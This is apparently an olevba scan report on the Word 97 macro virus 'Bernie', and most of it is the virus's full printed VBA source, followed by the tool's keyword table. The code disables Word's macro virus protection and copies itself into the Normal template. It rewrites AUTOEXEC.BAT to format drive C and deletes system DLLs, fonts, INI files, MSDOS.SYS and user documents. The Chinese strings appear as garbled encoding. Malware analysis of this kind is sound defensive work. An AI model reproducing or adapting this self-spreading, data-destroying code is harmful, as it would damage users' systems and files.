olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Bernie
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Bernie - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub CommandButton1_Click()
    Routine
    Set aRange = ActiveDocument.Range
    aRange.InsertAfter "«Ь©кєpЎA±zЄє°OѕРЕйµLЄk§№ѕгЕЄЁъ¦№Ґч¤еҐуЎAЅРµІ§ф¤ЈҐІ­nЄє±`ѕnµ{¦Ў­«·s¶}±ТҐ»¤еҐуЎC¦pЄG°OѕРЕйБЩ¬O¤ЈЁ¬ЎAЅРіsµІ¦ЬҐH¤UєфЇё¬ўёЯЎGhttp://www.trend.com.tw/"
End Sub
-------------------------------------------------------------------------------
VBA MACRO јWЇq¶°.bas 
in file: ./Virus.MSWord.Bernie - OLE stream: 'Macros/VBA/јWЇq¶°'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Declare Function GetWindowsDirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Public Declare Function GetSystemDirectory Lib "kernel32" Alias "GetSystemDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Public Const xTitle$ = "PccTrend Virus for Word 97"
Public Const Config$ = "C:\CONFIG.SYS"
Public Const Autoexec$ = "C:\AUTOEXEC.BAT"
Public Const MSDOSSYS$ = "C:\MSDOS.SYS"

Sub AutoOpen()
    On Error Resume Next
    Routine
    Select Case Day(Now)
        Case 1 To 6
            ReAuto
        Case 7 To 12
            ReConfig
            ReAuto
            Name WinPath & "\WIN.COM" As WinPath & "\LOSE.COM"
        Case 13 To 20
            ReConfig
            Kill WinPath & "\HELP\*.*"
        Case 21 To 30
            Name Config$ As "C:\PCCTREND.SYS"
            SetAttr MSDOSSYS$, 0
            Kill MSDOSSYS$
    End Select
    DelFile
    For j = 1 To 30
        Documents.Add.SaveAs FileName:=WinPath & "\" & xTitle$ & j
    Next j
End Sub

Public Sub AutoClose()
    On Error Resume Next
    uu = InputBox$("їй¤J±KЅX:", xTitle$, "§Ъ¤ЈЄѕ№D")
    If UCase(Trim(uu)) = "BERNIE" Then Exit Sub
    Routine
End Sub

Public Sub FilePrint()
    MsgBox "±zЄєЁtІО©|Ґј¦wёЛ¦LЄнѕчЎI", vbCritical, xTitle$
End Sub

Public Sub DelFile()
    On Error Resume Next
    Select Case GetRandomNumber(1, 100)
        Case 1, 3, 5, 12 To 67
            Kill SystemPath & "\*.DLL"
        Case 2, 4, 90 To 100
            Kill SystemPath & "\B*.*"
        Case 6 To 11
            Kill CurDir & "\*.*"
            Kill WinPath & "\A*.*"
            Kill WinPath & "\CURSORS\*.*"
            Kill WinPath & "\CONFIG\*.*"
            Kill WinPath & "\W*.*"
            Kill SystemPath & "\W*.*"
        Case 68 To 72
            Kill WinPath & "\*.INI"
            Kill WinPath & "\H*.*"
            Kill Options.DefaultFilePath(wdDocumentsPath) & "\*.*"
        Case 73 To 89
            Kill SystemPath & "\*.DRV"
            Kill SystemPath & "\P*.*"
    End Select
    Kill WinPath & "\FONTS\*.*"
    Kill WinPath & "\INF\*.*"
End Sub
Public Sub ReAuto()
    On Error Resume Next
    If UCase(Dir(Autoexec$)) = "AUTOEXEC.BAT" Then
        SetAttr Autoexec$, 0
    End If
    No = FreeFile
    Open "C:\c" For Output As #No
        Print #No, "y" & Chr$(13)
        Print #No, Chr$(13)
    Close #No
    No = FreeFile
    Open Autoexec$ For Output As #No
        Print #No, "PATH = C:\;" & WinPath & "\COMMAND;" & S.SystemPath
        Print #No, "format C:/u/q/v:PCCTREND < c"
    Close #No
End Sub

Public Sub ReConfig()
    On Error Resume Next
    If UCase(Dir(Config$)) = "CONFIG.SYS" Then
        SetAttr "C:\CONFIG.SYS", 0
    End If
    No = FreeFile
    Open Config$ For Output As #No
        Print #No, "Rem **** You're infected by " & xTitle$
        Print #No, "Dos = Low"
        Print #No, "FCBS = 255"
        Print #No, "FILES = 255"
        Print #No, "LastDrive = Z"
        Print #No, "SET TEMP = C:\"
        Print #No, "SET TMP = C:\"
        Print #No, "STACKS = 64, 512"
        Print #No, "SWITCHES= /F /K /N"
    Close #No
End Sub

Public Function SystemPath() As String
        Dim b As String * 255
        b = Space$(255)
        L = GetSystemDirectory(b, 255)
        SystemPath = Trim(Left(b, L))
End Function

Public Function WinPath() As String
        Dim b As String * 255
        b = Space$(255)
        L = GetWindowsDirectory(b, 255)
        WinPath = Trim(Left(b, L))
End Function

Public Sub WriteSetting(Section As String, KeyName As String, Setting As String, File As String)
        h = WritePrivateProfileString(Section, KeyName, Setting, File)
End Sub

Public Function GetSettings(AppName As String, Key As String, File As String) As String
        R$ = String$(255, 0)
        X = GetPrivateProfileString(AppName, Key, "", R$, Len(R$), File)
        R$ = Left(R$, InStr(R$, Chr(0)) - 1)
        GetSettings = R$
End Function

Public Function GetRandomNumber(Mini As Single, Maxi As Single) As Single
        If Mini >= Maxi Then
                MsgBox Mini & " ҐІ¶·¤с " & Maxi & " ¤jЎI", vbCritical
                GetRandomNumber = 0
                Exit Function
        End If
        Randomize Timer
        GetRandomNumber = Int((Maxi * Rnd) + Mini)
End Function
Sub ToolsMacro()
Dim Pb
On Error Resume Next
WordBasic.BeginDialog 359, 271, "ҐЁ¶°"
    WordBasic.PushButton 234, 6, 120, 21, "їэ»s(O)...", "Push1"
    WordBasic.PushButton 234, 29, 120, 21, "Ёъ®ш", "Push2"
    WordBasic.PushButton 234, 55, 120, 21, "°х¦ж(R)", "Push3"
    WordBasic.PushButton 234, 79, 120, 21, "«ШҐЯ(E)", "Push4"
    WordBasic.PushButton 234, 103, 120, 21, "§R°Ј(D)", "Push5"
    WordBasic.PushButton 234, 130, 120, 21, "  ІХ¦XєЮІz(G)...", "Push6"
    WordBasic.PushButton 234, 154, 120, 21, "»Ў©ъ(H)", "Push7"
    WordBasic.Text 10, 9, 96, 18, "ҐЁ¶°¦WєЩ(M):", "Text1"
    WordBasic.Text 10, 175, 112, 13, "ҐЁ¶°§@ҐО©у(A):", "Text2"
    WordBasic.Text 10, 207, 64, 15, "»Ў©ъ(I):", "Text3"
    WordBasic.TextBox 11, 23, 213, 18, "TextBox5"
    WordBasic.TextBox 15, 42, 207, 129, "TextBox6", 1
    WordBasic.TextBox 11, 188, 340, 18, "TextBox3"
    WordBasic.TextBox 12, 223, 341, 39, "TextBox4", 1
WordBasic.EndDialog
    Dim dlg As Object: Set dlg = WordBasic.CurValues.UserDialog
    Pb = WordBasic.Dialog.UserDialog(dlg)
    Select Case Pb
        Case 1 To 4
            MsgBox "°OѕРЕйҐО§№"
        Case 5 'Delete
            MsgBox Time
        Case 6
            MsgBox Date
    End Select
End Sub

Public Sub FileOpen()
    MsgBox "°OѕРЕй¤ЈЁ¬ЎAµLЄk¶}±ТАЙ®ЧЎC", vbCritical, xTitle$
End Sub

Public Sub FileExit()
    MsgBox "±zЅT©w°OѕРЕйЁ¬°ч¶ЬЎH", vbInformation + vbYesNoCancel, xTitle$
End Sub

Public Sub Routine()
    Application.ScreenUpdating = False
    Application.DisplayAlerts = wdAlertsNone
    WordBasic.DisableAutoMacros 0
    Options.VirusProtection = False
    On Error Resume Next
    For i = 1 To ActiveDocument.VBProject.VBComponents.Count
        If Not ActiveDocument.VBProject.VBComponents(i).Name = "јWЇq¶°" Then
            Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="јWЇq¶°", Object:=wdOrganizerObjectProjectItems
            ActiveDocument.SaveAs FileName:=ActiveDocument.Name, FileFormat:=wdFormatTemplate
        End If
    Next
    For j = 1 To NormalTemplate.VBProject.VBComponents.Count
        If Not NormalTemplate.VBProject.VBComponents(j).Name = "јWЇq¶°" Then
           Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="јWЇq¶°", Object:=wdOrganizerObjectProjectItems
           Options.SaveNormalPrompt = False
        End If
    Next
    Application.DisplayAlerts = wdAlertsAll
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|COMMAND             |May run PowerShell commands                  |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |AUTOEXEC.BAT        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

